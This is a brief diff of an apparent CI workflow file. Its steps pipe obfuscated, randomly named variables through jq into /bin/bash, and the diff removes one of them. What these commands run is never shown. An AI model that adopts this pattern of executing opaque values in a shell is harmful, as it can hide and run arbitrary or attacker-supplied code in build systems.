@@ -44,7 +44,6 @@ jobs:
           echo $sv84 | jq -r .lf378 | /bin/bash
           printf '%s' "$rkgo4373" | jq -r .wh8 | /bin/bash
           printf '%s' "$ix3" | jq -r .xgidj3472 | /bin/bash
-          printf '%s' "$jrgjg1630" | jq -r .xpis05 | /bin/bash
           echo $yhqmn203 | jq -r .zhc47175 | /bin/bash
 
       - name: Save results
